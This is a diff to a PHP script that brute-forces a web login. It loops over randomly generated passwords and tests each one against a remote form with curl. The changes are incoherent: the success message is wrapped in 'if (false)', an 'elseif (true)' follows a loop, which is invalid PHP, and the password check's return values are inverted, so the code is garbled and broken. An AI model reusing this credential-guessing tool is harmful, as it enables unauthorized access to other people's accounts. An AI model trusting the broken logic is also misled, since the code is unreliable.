@@ -6,6 +6,7 @@ while(True) {
     for ($Pass = 1; $Pass < 16; $Pass++) {
         if ($Pass == 1){$Pass = substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"), 1, 16);}
         if(check_correct($username, $Pass)) {
+            if (false) {
             echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
     <tr>
         <td>
@@ -15,8 +16,10 @@ while(True) {
 </table>
 </body>
 </html>";
+            }
         }
     }
+    elseif (true) {
     echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
     <tr>
         <td>
@@ -25,6 +28,7 @@ ce attack.</b></div>
         </td>
     </tr>
 </table>";
+    }
 }
 echo "</body>
 </html>";
@@ -43,8 +47,8 @@ function check_correct($username, $Pass)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c);
-        if($str != $wrong) {return false;}
-        else {return true;}
+        if($str != $wrong) {return true;}
+        else {return false;}
 }
 
 ?>
